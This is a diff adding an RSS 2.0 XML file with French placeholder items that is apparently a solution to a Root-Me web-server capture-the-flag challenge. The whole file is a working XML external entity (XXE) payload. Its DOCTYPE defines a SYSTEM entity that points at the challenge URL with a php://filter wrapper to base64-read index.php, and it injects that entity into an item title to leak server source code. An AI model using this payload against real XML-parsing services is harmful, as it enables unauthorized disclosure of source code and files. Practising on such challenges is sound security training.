@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+    <!ENTITY xxe0 "Voldemort" >
+    <!ENTITY xxe1 SYSTEM "http://challenge01.root-me.org/web-serveur/ch29/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" >
+]>
+<rss version="2.0">
+    <channel>
+        <title>Mon flux RSS</title>
+        <description>Exemple de flux RSS 2.0</description>
+        <item>
+            <title>&xxe1;</title>
+            <description>Premier article</description>
+            <link>http://www.example.org/actu1</link>
+        </item>
+        <item>
+            <title>Hello World</title>
+            <description>Ceci est ma seconde actualité</description>
+            <link>http://www.example.org/actu2</link>
+        </item>
+    </channel>
+</rss>
